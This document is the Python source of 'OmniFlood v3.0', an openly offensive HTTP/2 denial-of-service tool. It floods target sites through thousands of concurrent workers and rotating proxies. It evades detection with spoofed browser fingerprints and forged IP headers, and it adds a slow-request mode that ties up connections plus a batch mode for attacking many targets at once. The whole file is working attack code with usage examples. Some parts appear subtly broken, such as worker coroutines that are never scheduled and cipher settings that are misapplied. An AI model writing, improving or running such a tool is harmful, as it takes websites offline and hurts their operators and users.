#!/usr/bin/env python3
"""
OmniFlood v3.0 - Unified HTTP/2 DDoS Tool
Combines: Node.js HTTP/2 flooding, Go concurrency, browser fingerprinting, proxy rotation
Author: CATShadow - Supreme Coder
"""

import asyncio
import aiohttp
import ssl
import random
import time
import socket
import hashlib
import json
import base64
import zlib
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from typing import List, Dict, Optional, Tuple
import argparse
import sys
import os
from urllib.parse import urlparse, urlencode
import h2.connection
import h2.config
import h2.events
import h2.settings
from h2.exceptions import ProtocolError, NoSuchStreamError
import aiohttp_socks

# ==================== CONFIGURATION ====================
MAX_WORKERS = 2000
CONNECTION_POOL_SIZE = 500
PROXY_REFRESH_INTERVAL = 300  # seconds

# ==================== JA3 FINGERPRINTS ====================
JA3_SIGNATURES = [
    {
        "name": "Chrome 120-130",
        "ciphers": [
            "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384",
            "TLS_CHACHA20_POLY1305_SHA256", "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256", "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
            "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
        ],
        "curves": ["X25519", "secp256r1", "secp384r1"],
        "next_protos": ["h2", "http/1.1"],
        "min_version": ssl.TLSVersion.TLSv1_2,
        "max_version": ssl.TLSVersion.TLSv1_3
    },
    {
        "name": "Firefox 120-130",
        "ciphers": [
            "TLS_AES_128_GCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256",
            "TLS_AES_256_GCM_SHA384", "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
        ],
        "curves": ["X25519", "secp256r1", "secp384r1", "secp521r1"],
        "next_protos": ["h2", "http/1.1"],
        "min_version": ssl.TLSVersion.TLSv1_2,
        "max_version": ssl.TLSVersion.TLSv1_3
    }
]

# ==================== BROWSER PROFILES ====================
BROWSER_PROFILES = {
    "chrome": {
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        ],
        "sec_ch_ua": '"Google Chrome";v="120", "Chromium";v="120", "Not?A_Brand";v="24"',
        "platform": "Windows"
    },
    "firefox": {
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0"
        ],
        "sec_ch_ua": '"Firefox";v="120", "Gecko";v="120"',
        "platform": "Windows"
    },
    "edge": {
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
        ],
        "sec_ch_ua": '"Microsoft Edge";v="120", "Chromium";v="120", "Not?A_Brand";v="24"',
        "platform": "Windows"
    }
}

# ==================== UTILITY FUNCTIONS ====================
def rand_str(length: int) -> str:
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

def rand_int(min_val: int, max_val: int) -> int:
    return random.randint(min_val, max_val)

def rand_bool() -> bool:
    return random.choice([True, False])

def random_ip() -> str:
    return f"{rand_int(1,255)}.{rand_int(1,255)}.{rand_int(1,255)}.{rand_int(1,255)}"

def generate_cache_bust() -> str:
    methods = [
        f"?v={rand_int(1,1000000)}",
        f"?_={int(time.time()*1000)}",
        f"?rnd={rand_str(16)}"
    ]
    return random.choice(methods)

def generate_path(base_path: str = "/") -> str:
    paths = [
        "/", "/index.html", "/home", "/main", "/default", "/welcome",
        "/api/v1/users", "/api/v1/data", "/api/v2/info",
        "/wp-admin", "/admin", "/login", "/dashboard",
        f"/page/{rand_int(1,1000)}",
        f"/post/{rand_str(8)}"
    ]
    return random.choice(paths)

def generate_student_number() -> str:
    return f"{rand_int(2015,2025)}-{rand_int(1,99999):05d}"

def generate_cookies() -> str:
    cookies = []
    if rand_bool():
        cookies.append(f"session_id={rand_str(24)}")
    if rand_bool():
        cookies.append(f"csrf_token={rand_str(16)}")
    return "; ".join(cookies) if cookies else ""

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self, proxy_file: Optional[str] = None):
        self.proxies = []
        self.index = 0
        self.lock = asyncio.Lock()
        if proxy_file and os.path.exists(proxy_file):
            self.load_proxies(proxy_file)
    
    def load_proxies(self, proxy_file: str):
        with open(proxy_file, 'r') as f:
            self.proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    async def get_proxy(self) -> Optional[str]:
        async with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return proxy

# ==================== HTTP/2 CONNECTION MANAGER ====================
class H2ConnectionManager:
    def __init__(self, target: str, proxy_manager: Optional[ProxyManager] = None):
        self.target = target
        self.proxy_manager = proxy_manager
        self.connections = []
        self.lock = asyncio.Lock()
        self.stream_counter = 0
        
    async def create_connection(self) -> Optional[aiohttp.ClientSession]:
        try:
            proxy_url = await self.proxy_manager.get_proxy() if self.proxy_manager else None
            
            # Create SSL context with JA3 fingerprinting
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
            
            # Select random JA3 signature
            ja3 = random.choice(JA3_SIGNATURES)
            
            # Configure cipher suites
            ssl_ctx.set_ciphers(':'.join(ja3['ciphers']))
            
            # Set TLS versions
            ssl_ctx.minimum_version = ja3['min_version']
            ssl_ctx.maximum_version = ja3['max_version']
            
            # ALPN for HTTP/2
            ssl_ctx.set_alpn_protocols(['h2', 'http/1.1'])
            
            connector = None
            if proxy_url:
                if proxy_url.startswith('socks5://'):
                    connector = aiohttp_socks.SocksConnector.from_url(proxy_url)
                else:
                    connector = aiohttp.TCPConnector(ssl=ssl_ctx, force_close=True)
            else:
                connector = aiohttp.TCPConnector(ssl=ssl_ctx, force_close=True)
            
            timeout = aiohttp.ClientTimeout(total=30, connect=10)
            session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers=self._generate_headers()
            )
            return session
        except Exception as e:
            return None
    
    def _generate_headers(self) -> Dict:
        profile_name = random.choice(list(BROWSER_PROFILES.keys()))
        profile = BROWSER_PROFILES[profile_name]
        
        headers = {
            'User-Agent': random.choice(profile['user_agents']),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9']),
            'Sec-Ch-Ua': profile['sec_ch_ua'],
            'Sec-Ch-Ua-Mobile': '?0' if rand_bool() else '?1',
            'Sec-Ch-Ua-Platform': f'"{profile["platform"]}"',
            'Sec-Fetch-Dest': random.choice(['document', 'script', 'image']),
            'Sec-Fetch-Mode': random.choice(['navigate', 'cors']),
            'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site']),
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['no-cache', 'max-age=0', 'must-revalidate']),
            'DNT': '1',
            'X-Forwarded-For': random_ip(),
            'X-Real-IP': random_ip(),
            'Connection': 'keep-alive',
        }
        
        # Add random headers
        if rand_bool():
            headers['X-Requested-With'] = 'XMLHttpRequest'
        if rand_bool():
            cookies = generate_cookies()
            if cookies:
                headers['Cookie'] = cookies
        
        return headers
    
    async def get_connection(self) -> Optional[aiohttp.ClientSession]:
        async with self.lock:
            # Clean dead connections
            self.connections = [c for c in self.connections if not c.closed]
            
            # Create new connection if needed
            if len(self.connections) < CONNECTION_POOL_SIZE:
                session = await self.create_connection()
                if session:
                    self.connections.append(session)
                    return session
            
            # Return random connection
            if self.connections:
                session = random.choice(self.connections)
                if not session.closed:
                    return session
            return None

# ==================== ATTACK ENGINE ====================
class AttackEngine:
    def __init__(self, target: str, mode: str, duration: int, rate: int, proxy_manager: Optional[ProxyManager] = None):
        self.target = target
        self.mode = mode.upper()
        self.duration = duration
        self.rate = rate
        self.proxy_manager = proxy_manager
        self.stats = {'total': 0, 'success': 0, 'failed': 0}
        self.running = True
        self.conn_manager = H2ConnectionManager(target, proxy_manager)
        self.semaphore = asyncio.Semaphore(MAX_WORKERS)
        
    async def attack_worker(self):
        while self.running:
            try:
                async with self.semaphore:
                    session = await self.conn_manager.get_connection()
                    if not session:
                        await asyncio.sleep(0.1)
                        continue
                    
                    path = generate_path()
                    if rand_int(1,100) <= 70:
                        path += generate_cache_bust()
                    
                    full_url = self.target.rstrip('/') + path
                    
                    # Generate mode-specific payload
                    data = None
                    if self.mode == 'POST':
                        data = f"student_id={generate_student_number()}&password={rand_str(12)}"
                        # Randomize content type
                        content_type = random.choice([
                            'application/x-www-form-urlencoded',
                            'multipart/form-data',
                            'application/json'
                        ])
                        if content_type == 'application/json':
                            data = json.dumps({
                                'username': rand_str(10),
                                'password': rand_str(15),
                                'email': f"{rand_str(8)}@example.com"
                            })
                    
                    # Make request
                    start_time = time.time()
                    try:
                        async with session.request(
                            method=self.mode if self.mode != 'SLOW' else 'GET',
                            url=full_url,
                            data=data,
                            headers=self._generate_attack_headers(),
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as response:
                            # Read response body for HEAD/GET
                            if self.mode != 'HEAD':
                                await response.read()
                            self.stats['success'] += 1
                    except Exception:
                        self.stats['failed'] += 1
                    
                    self.stats['total'] += 1
                    
                    # Rate limiting
                    await asyncio.sleep(max(0, (1/self.rate) - (time.time() - start_time)))
                    
            except Exception:
                await asyncio.sleep(0.1)
    
    def _generate_attack_headers(self) -> Dict:
        headers = self.conn_manager._generate_headers()
        
        # Add attack-specific headers
        if rand_bool():
            headers['X-Custom-Header'] = rand_str(20)
        if rand_bool():
            headers['X-Forwarded-For'] = random_ip()
        if rand_bool():
            headers['Via'] = f'1.1 {random_ip()}'
        
        return headers
    
    async def run(self):
        # Create initial connections
        initial_tasks = [self.conn_manager.create_connection() for _ in range(min(100, CONNECTION_POOL_SIZE))]
        await asyncio.gather(*initial_tasks)
        
        # Start workers
        workers = [self.attack_worker() for _ in range(MAX_WORKERS)]
        
        # Stop after duration
        await asyncio.sleep(self.duration)
        self.running = False
        
        # Wait for workers to finish
        await asyncio.gather(*workers, return_exceptions=True)
        
        return self.stats

# ==================== HTTP/1.1 SLOW ATTACK ====================
class SlowAttackEngine:
    def __init__(self, target: str, duration: int, rate: int):
        self.target = target
        self.duration = duration
        self.rate = rate
        self.stats = {'total': 0, 'connections': 0}
        
    async def slow_worker(self):
        parsed = urlparse(self.target)
        host = parsed.hostname
        port = 443 if parsed.scheme == 'https' else 80
        is_https = parsed.scheme == 'https'
        
        while True:
            try:
                # Create socket connection
                reader, writer = await asyncio.open_connection(
                    host, port, ssl=is_https
                )
                
                # Send partial HTTP request
                request = (
                    f"GET {parsed.path or '/'} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(BROWSER_PROFILES['chrome']['user_agents'])}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n"
                    f"X-Forwarded-For: {random_ip()}\r\n"
                )
                
                # Send request slowly (line by line with delays)
                lines = request.split('\r\n')
                for i, line in enumerate(lines):
                    writer.write((line + '\r\n').encode())
                    await writer.drain()
                    await asyncio.sleep(0.5)  # Slow down
                
                # Don't send final \r\n, keep connection open
                self.stats['connections'] += 1
                self.stats['total'] += 1
                
                # Keep connection alive
                await asyncio.sleep(30)
                writer.close()
                await writer.wait_closed()
                
            except Exception:
                pass
            
            await asyncio.sleep(1/self.rate)
    
    async def run(self):
        workers = [self.slow_worker() for _ in range(1000)]
        await asyncio.sleep(self.duration)
        await asyncio.gather(*workers, return_exceptions=True)
        return self.stats

# ==================== BATCH ATTACK ====================
class BatchAttack:
    def __init__(self, targets_file: str, mode: str, duration: int, rate: int, proxy_file: Optional[str] = None):
        self.targets = []
        self.mode = mode
        self.duration = duration
        self.rate = rate
        self.proxy_file = proxy_file
        
        with open(targets_file, 'r') as f:
            self.targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    async def attack_target(self, target: str):
        proxy_manager = ProxyManager(self.proxy_file) if self.proxy_file else None
        engine = AttackEngine(target, self.mode, self.duration, self.rate // len(self.targets), proxy_manager)
        stats = await engine.run()
        return target, stats
    
    async def run(self):
        tasks = [self.attack_target(target) for target in self.targets]
        results = await asyncio.gather(*tasks)
        
        print("\n" + "="*70)
        print("BATCH ATTACK COMPLETE")
        print("="*70)
        for target, stats in results:
            print(f"\nTarget: {target}")
            print(f"  Total Requests: {stats['total']}")
            print(f"  Success: {stats['success']}")
            print(f"  Failed: {stats['failed']}")
        
        return results

# ==================== MAIN ====================
def parse_arguments():
    parser = argparse.ArgumentParser(
        description="OmniFlood - HTTP/2 DDoS Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python omni.py https://target.com 60 GET 1000
  python omni.py https://target.com 120 POST 500 --proxies proxies.txt
  python omni.py https://target.com 30 HEAD 2000 --slow
  python omni.py --batch targets.txt 60 GET 100 --proxies proxies.txt
  python omni.py https://target.com 60 SLOW 10
        """
    )
    
    parser.add_argument('target', nargs='?', help='Target URL')
    parser.add_argument('duration', nargs='?', type=int, help='Attack duration in seconds')
    parser.add_argument('mode', nargs='?', choices=['GET', 'POST', 'HEAD', 'SLOW'], help='Attack mode')
    parser.add_argument('rate', nargs='?', type=int, help='Requests per second')
    parser.add_argument('--proxies', help='Proxy file (ip:port per line)')
    parser.add_argument('--batch', help='Targets file (one per line)')
    parser.add_argument('--slow', action='store_true', help='Use slow attack (HTTP/1.1 partial requests)')
    parser.add_argument('--threads', type=int, default=2000, help='Number of concurrent workers')
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.batch:
        if not os.path.exists(args.batch):
            print(f"[!] Batch file not found: {args.batch}")
            sys.exit(1)
        return args
    
    if not args.target or not args.duration or not args.mode or not args.rate:
        parser.print_help()
        sys.exit(1)
    
    if not args.target.startswith(('http://', 'https://')):
        args.target = 'https://' + args.target
    
    return args

async def main_async():
    args = parse_arguments()
    
    print(f"""
    🐱 CATShadow OmniFlood v3.0
    {'='*50}
    Target: {args.target if not args.batch else 'BATCH MODE'}
    Duration: {args.duration}s
    Mode: {args.mode if not args.batch else 'MIXED'}
    Rate: {args.rate}/s
    Workers: {args.threads}
    Proxies: {args.proxies if args.proxies else 'DIRECT'}
    """)
    
    # Batch mode
    if args.batch:
        batch = BatchAttack(args.batch, args.mode or 'GET', args.duration, args.rate, args.proxies)
        await batch.run()
        return
    
    # Setup proxy manager
    proxy_manager = ProxyManager(args.proxies) if args.proxies else None
    
    # Slow attack
    if args.mode == 'SLOW' or args.slow:
        engine = SlowAttackEngine(args.target, args.duration, args.rate)
        stats = await engine.run()
        print(f"\nSlow Attack Complete: {stats['total']} requests, {stats['connections']} connections kept open")
        return
    
    # Regular attack
    engine = AttackEngine(args.target, args.mode, args.duration, args.rate, proxy_manager)
    MAX_WORKERS = args.threads
    
    try:
        stats = await engine.run()
        print(f"\nAttack Complete:")
        print(f"  Total Requests: {stats['total']}")
        print(f"  Successful: {stats['success']}")
        print(f"  Failed: {stats['failed']}")
        print(f"  Success Rate: {(stats['success']/stats['total']*100 if stats['total'] > 0 else 0):.1f}%")
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    finally:
        # Cleanup connections
        for conn in engine.conn_manager.connections:
            try:
                await conn.close()
            except:
                pass

if __name__ == "__main__":
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
